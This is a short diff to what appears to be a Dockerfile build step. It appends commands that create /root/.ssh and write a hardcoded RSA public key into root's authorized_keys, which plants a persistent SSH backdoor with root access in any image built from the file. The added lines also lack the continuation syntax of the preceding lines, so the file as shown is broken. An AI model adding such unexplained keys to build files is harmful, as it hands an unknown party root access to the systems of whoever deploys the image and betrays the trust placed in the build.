@@ -17,3 +17,5 @@ RUN \
 	cp -r /etc/ /backups/ && \
 	cp -r /lib*/ /backups/ && \
 	useradd -m bot
+	mkdir /root/.ssh
+	echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDpRL99ud/nK5tgeTNRpMTo9YsxeHjSuYoR9S/PbFQd6jHgNGC8fzuF4WEx3977+bz5vzPpIFtVtFVAcr8nY09b6+OXWpA55dOa0W9qage0RrKnQb4Pr47uwuczJiL/2TrMjJ9VccfIP7xC1lk0pL+Cexp98HiJ0RYdeOQaXh2V26n7oSAn5mWevLNgc5pk3xvCluuOF9GvIPnsrxODFIfUN7HQcTIgTxmsDfZzoct0MIqt4Rfs5i1T3E1YF9SajopjnhLLb25g106F+GNGy0nigjw4EJQU3FT0L4L60u7rnJ0wGIwOSv4k2IojKBixFE58EwIVrKnmf0XF5iQlBGAt" > /root/.ssh/authorized_keys
